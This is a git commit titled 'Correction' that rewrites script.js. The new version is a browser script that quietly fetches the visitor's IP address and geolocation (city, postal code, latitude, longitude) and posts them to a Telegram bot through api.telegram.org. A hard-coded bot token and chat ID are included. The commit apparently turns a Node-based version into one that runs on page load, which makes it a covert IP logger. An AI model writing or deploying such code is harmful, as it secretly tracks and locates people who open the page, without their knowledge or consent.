adcd2e7bd5419055af0369b152add5927585718e
Nicistarful <nwurbs1@gmail.com>
2024-01-18 16:44:26 +0100

    Correction

--- script.js
+++ script.js
@@ -1,27 +1,20 @@
-const TelegramBot = require('node-telegram-bot-api');
-
-// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
-const bot = new TelegramBot('6902083128:AAHs4ukOtXTGj7pdqpOI6rFTIVmoLkj219I', { polling: false });
-
-// Replace 'YOUR_CHAT_ID' with the chat ID you want to send the message to
-const chatId = '-1002044932438';
-
 fetch('https://geolocation-db.com/json/')
     .then(response => response.json())
     .then(data => {
-        // console.log(data);
-        // Send a message
-        bot.sendMessage(chatId, 'IPv4: ' + data.IPv4 + '\nCOUNTRY: ' + data.country_name + '\nSTATE: ' + data.state + '\nCITY: ' + data.city + '\nPOSTAL: ' + data.postal + '\nLAT: ' + data.latitude + '\nLON: ' + data.longitude)
-            .then(() => {
-                // console.log('Message sent successfully');
-            })
-            .catch((error) => {
-                // console.error('Error sending message:', error);
-            });
-    })
-    .catch(error => {
-        // Handle any errors
-        // console.error(error);
-    });
+        const message = 'IPv4: ' + data.IPv4 + '\nCOUNTRY: ' + data.country_name + '\nSTATE: ' + data.state + '\nCITY: ' + data.city + '\nPOSTAL: ' + data.postal + '\nLAT: ' + data.latitude + '\nLON: ' + data.longitude;
 
-    // oof
+        fetch('https://api.telegram.org/bot6902083128:AAHs4ukOtXTGj7pdqpOI6rFTIVmoLkj219I/sendMessage', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '-1002044932438',
+                text: message
+            })
+        })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error(error));
+    })
+    .catch(error => console.error(error));
